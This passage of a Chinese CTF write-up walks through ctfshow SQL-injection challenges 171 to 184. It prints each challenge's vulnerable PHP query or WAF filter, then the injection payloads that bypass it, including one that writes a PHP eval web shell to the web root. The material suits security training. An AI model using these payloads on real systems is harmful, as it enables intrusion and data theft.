punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;columns&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; table_name &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;columns&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;b&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; table_name &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;columns&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;web-171&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-171&#34;&gt;#&lt;/a&gt; web 171&lt;/h1&gt;
&lt;p&gt;根据查询语句&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$sql = &#34;select username,password from user where username !=&#39;flag&#39; and id = &#39;&#34;.$_GET[&#39;id&#39;].&#34;&#39; limit 1;&#34;;&lt;/code&gt;  可知可用单引号闭合，然后利用 or 的特性&lt;/p&gt;
&lt;p&gt;&lt;code&gt;0&#39; or username=&#39;flag&#39;%23&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;查找到 flag&lt;/p&gt;
&lt;h1 id=&#34;web-172&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-172&#34;&gt;#&lt;/a&gt; web 172&lt;/h1&gt;
&lt;p&gt;使用联合注入&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 检查结果是否有 flag&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$row&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!==&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;flag&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token variable&#34;&gt;$ret&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;msg&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;查询成功&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;code&gt;&#39; union select 1,password from ctfshow_user2 where username =&#39;flag&#39;%23&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-173&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-173&#34;&gt;#&lt;/a&gt; web 173&lt;/h1&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;/flag/i&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;json_encode&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$ret&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token variable&#34;&gt;$ret&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;msg&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;查询成功&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;同上题&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&#39; union select 1,2,password from ctfshow_user3 where username =&#39;flag&#39;%23&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-174&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-174&#34;&gt;#&lt;/a&gt; web 174&lt;/h1&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;/flag/i&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;json_encode&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$ret&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token variable&#34;&gt;$ret&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;msg&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;查询成功&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这题使用 &lt;code&gt;replace&lt;/code&gt;  函数对数字进行替换&lt;/p&gt;
&lt;p&gt;注意需要抓包，因为内容过长，正常提交不上去，同时 url 编码&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&#39;%20union%20select%20&#39;a&#39;%2Creplace(replace(replace(replace(replace(replace(replace(replace(replace(replace((b.password)%2C&#39;0&#39;%2C&#39;!&#39;)%2C&#39;1&#39;%2C&#39;%23&#39;)%2C&#39;2&#39;%2C&#39;%24&#39;)%2C&#39;3&#39;%2C&#39;%25&#39;)%2C&#39;4&#39;%2C&#39;%26&#39;)%2C&#39;5&#39;%2C&#39;(&#39;)%2C&#39;6&#39;%2C&#39;)&#39;)%2C&#39;7&#39;%2C&#39;*&#39;)%2C&#39;8&#39;%2C&#39;%2B&#39;)%2C&#39;9&#39;%2C&#39;%2C&#39;)%20from%20ctfshow_user4%20as%20b%20where%20b.username%3D&#39;flag&#39;%23&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-175&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-175&#34;&gt;#&lt;/a&gt; web 175&lt;/h1&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 检查结果是否有 flag&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;/[\x00-\x7f]/i&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;json_encode&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$ret&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token variable&#34;&gt;$ret&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;msg&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;查询成功&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;过滤了所有 ASCII 字符&lt;/p&gt;
&lt;p&gt;写文件&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&#39;%20union%20select%201%2C%22%3C%3Fphp%20eval(%24_POST%5B1%5D)%3B%22%20into%20outfile%20%22%2Fvar%2Fwww%2Fhtml%2F1.php%22%23&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;然后蚁剑连接，进入数据库，查询 flag  &lt;code&gt;select password from ctfshow_user5 where username=&#39;flag&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-176&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-176&#34;&gt;#&lt;/a&gt; web 176&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;0&#39; or username=&#39;flag&#39;%23&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-177&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-177&#34;&gt;#&lt;/a&gt; web 177&lt;/h1&gt;
&lt;p&gt;过滤了空格&lt;/p&gt;
&lt;p&gt;&lt;code&gt;0&#39;/**/or/**/username=&#39;flag&#39;%23&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-178&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-178&#34;&gt;#&lt;/a&gt; web 178&lt;/h1&gt;
&lt;p&gt;前面的空格绕过用不了，这里使用 &lt;code&gt;%0a&lt;/code&gt;  和括号绕过&lt;/p&gt;
&lt;p&gt;&lt;code&gt;0&#39;union%0aselect&#39;1&#39;,&#39;2&#39;,(select(password)from(ctfshow_user)where(username=&#39;flag&#39;))%23&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;或者仅仅用括号&lt;/p&gt;
&lt;p&gt;&lt;code&gt;0&#39;or(username=&#39;flag&#39;)%23&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-179&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-179&#34;&gt;#&lt;/a&gt; web 179&lt;/h1&gt;
&lt;p&gt;同上一题做法&lt;/p&gt;
&lt;h1 id=&#34;web-180&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-180&#34;&gt;#&lt;/a&gt; web 180&lt;/h1&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &#39;&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;id&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&#39; limit 1;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;解法一&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#解法一&#34;&gt;#&lt;/a&gt; 解法一&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;0&#39;union%0cselect&#39;1&#39;,&#39;2&#39;,(select(password)from(ctfshow_user)where(username=&#39;flag&#39;))&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;由于过滤了 &lt;code&gt;--+&lt;/code&gt;  和 &lt;code&gt;#&lt;/code&gt; ，只能使用闭合&lt;/p&gt;
&lt;h2 id=&#34;解法二&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#解法二&#34;&gt;#&lt;/a&gt; 解法二&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;0&#39;or(username=&#39;flag&#39;)and&#39;2&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;原理是运用了 sql 语句的判断优先级，与原查询语句组合后，得到 &lt;code&gt;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = 0&#39;or(username=&#39;flag&#39;)and&#39;2&#39; limit 1;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;username!=&#39;flag&#39; and id=0&lt;/code&gt;  和 &lt;code&gt;username=&#39;flag&#39; and &#39;2&#39;&lt;/code&gt;  作为两个条件进行判断，因此可以返回结果&lt;/p&gt;
&lt;h1 id=&#34;web-181&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-181&#34;&gt;#&lt;/a&gt; web 181&lt;/h1&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;waf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;用上一题的解法二即可&lt;/p&gt;
&lt;h1 id=&#34;web-182&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-182&#34;&gt;#&lt;/a&gt; web 182&lt;/h1&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 对传入的参数进行了过滤&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;waf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;过滤了 flag，前面的 &lt;code&gt;username=&#39;flag&#39;&lt;/code&gt;  用不了，这里可以使用正则 &lt;code&gt;0&#39;or(username)regexp&#39;f&#39;and&#39;2&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;或者根据前面做题，知 flag 始终在 id 为 26 的地方，故可以使用 &lt;code&gt;id=26&lt;/code&gt; , 即 &lt;code&gt;0&#39;or(id=26)and&#39;2&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-183&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-183&#34;&gt;#&lt;/a&gt; web 183&lt;/h1&gt;
&lt;p&gt;``&lt;/p&gt;
&lt;h1 id=&#34;web-184&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-184&#34;&gt;#&lt;/a&gt; web 184&lt;/h1&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 查询语句&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 拼接 sql 语句查找指定 ID 用户&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;select count(*) from &#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;tableName&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 返回逻辑&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;waf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&#34;|union|\`|sleep|benchmark/i&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td 